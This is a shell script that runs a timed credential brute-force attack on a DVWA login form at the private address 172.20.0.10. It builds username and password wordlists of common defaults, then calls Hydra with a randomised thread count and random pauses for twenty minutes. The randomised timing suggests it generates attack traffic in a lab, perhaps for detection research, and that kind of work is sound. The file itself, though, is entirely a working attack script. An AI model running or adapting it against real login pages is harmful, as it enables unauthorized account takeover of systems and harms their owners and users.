#!/bin/sh
echo "[BRUTEFORCE-WEB] Starting..."
TARGET="172.20.0.10"
END=$(($(date +%s) + 1200))

cat > /tmp/users.txt << 'EOF'
admin
root
user
test
guest
operator
administrator
webmaster
support
service
manager
info
demo
backup
dev
EOF

cat > /tmp/passwords.txt << 'EOF'
password
123456
admin
pass
letmein
qwerty
test
dvwa
root
abc123
welcome
login
master
dragon
monkey
shadow
sunshine
princess
football
iloveyou
EOF

while [ $(date +%s) -lt $END ]; do
    THREADS=$((RANDOM % 5 + 2))
    hydra -L /tmp/users.txt -P /tmp/passwords.txt \
        -s 80 $TARGET \
        http-post-form \
        "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
        -t $THREADS -q 2>/dev/null
    sleep $((RANDOM % 5 + 1))
done
echo "[BRUTEFORCE-WEB] Done."